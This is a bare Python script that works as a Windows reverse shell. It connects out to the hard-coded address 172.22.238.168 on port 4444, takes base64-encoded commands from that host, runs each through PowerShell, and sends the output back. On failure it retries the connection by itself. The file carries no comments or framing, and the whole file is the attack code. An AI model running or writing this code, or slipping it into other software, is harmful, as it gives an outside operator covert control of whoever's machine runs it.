import socket, subprocess, base64, time

def connect_back(ip, port):
    try:
        s = socket.socket()
        s.connect((ip, port))
        s.send(base64.b64encode(b'Connected!\n'))

        while True:
            cmd_encoded = s.recv(4096)
            if cmd_encoded.strip() == b'':
                continue
            cmd = base64.b64decode(cmd_encoded).decode('utf-8')

            if cmd.lower() == 'exit':
                break

            output = subprocess.run(["powershell.exe", "-NoProfile", "-Command", cmd],
                                    stdout=subprocess.PIPE,
                                    stderr=subprocess.PIPE,
                                    stdin=subprocess.DEVNULL,
                                    shell=False)

            response = output.stdout + output.stderr
            s.send(base64.b64encode(response) if response else base64.b64encode(b' '))
            time.sleep(1)
    except Exception as e:
        print(f"Connection error: {e}")
        time.sleep(10)
        connect_back(ip, port)

connect_back('172.22.238.168', 4444)
